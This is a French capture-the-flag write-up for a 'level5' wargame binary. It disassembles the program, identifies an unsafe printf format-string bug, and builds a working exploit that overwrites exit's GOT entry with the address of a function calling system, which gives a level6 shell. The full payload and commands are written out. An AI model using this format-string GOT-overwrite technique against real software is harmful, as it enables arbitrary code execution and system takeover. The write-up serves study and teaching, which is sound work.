On reste sur un programme qui repette ce qu'on lui dit.

Avec GDB et info functions, on voit 3 fonctions main, o, n.

main
Dump of assembler code for function main:
   0x08048504 <+0>:     push   %ebp
   0x08048505 <+1>:     mov    %esp,%ebp
   0x08048507 <+3>:     and    $0xfffffff0,%esp
   0x0804850a <+6>:     call   0x80484c2 <n>
   0x0804850f <+11>:    leave
   0x08048510 <+12>:    ret
End of assembler dump.

o
Dump of assembler code for function o:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x18,%esp
   0x080484aa <+6>:     movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
   0x080484b6 <+18>:    movl   $0x1,(%esp)
   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
End of assembler dump.

n
Dump of assembler code for function n:
   0x080484c2 <+0>:     push   %ebp
   0x080484c3 <+1>:     mov    %esp,%ebp
   0x080484c5 <+3>:     sub    $0x218,%esp
   0x080484cb <+9>:     mov    0x8049848,%eax
   0x080484d0 <+14>:    mov    %eax,0x8(%esp)
   0x080484d4 <+18>:    movl   $0x200,0x4(%esp)
   0x080484dc <+26>:    lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:    mov    %eax,(%esp)
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:    mov    %eax,(%esp)
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    movl   $0x1,(%esp)
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.

On est encore sur une faille du printf qui n'est pas sécurisé. On remarque qu'il y a un appel systeme de la fonction o mais elle n'est pas appelé

La différence est qu'au lieu de modifier une variable, on va devoir écraser l'adresse de retour de n par adresse de o pour appeller l'appel systeme.

La problematique est qu'il n'y a pas de fonction de retour mais simplement un exit. Il faut donc qu'on remplace le exit. Nos recherches nous ont montré que exit est dans le GOT. GOT (Global Offset Table) est une table d'adresse qui contient les adresses des fonctions des librairies partagés (exit est concerné). On apprend aussi que GOT est inscriptible et que lorsque exit est appellé l'adresse dans le GOT est regardé directement.

Nous devons donc trouver l'adresse de exit dans GOT.

pour cela on fait `objdump -R level5 | grep exit`

`08049828 R_386_JUMP_SLOT   _exit`
`08049838 R_386_JUMP_SLOT   exit` <- la fonction que l'on utilise

pour rappel l'adresse de o est 0x080484a4

De la même manière on regarde quelle partie de la pille est notre buffer. 

`python -c 'print "aaaa" + " %x" * 10' > /tmp/exploit`
`cat /tmp/exploit | ./level5`
`aaaa 200 b7fd1ac0 b7ff37d0 61616161 20782520 25207825 78252078 20782520 25207825 78252078`

En l'occurence le 4ème.

On va donc cibler le exit de GOT. Et ajouter l'adresse de o (-4 octes car il y a l'adresse de exit). L'adresse de o en décimal est 134513824. Donc avec d. Il va nous afficher un nombre de carractere correspondant. Et %4$n va modifier la 4ème valeur.

`python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/final_exploit`
`cat /tmp/final_exploit - | ./level5`

On arrive dans un shell level6, on recupère le flag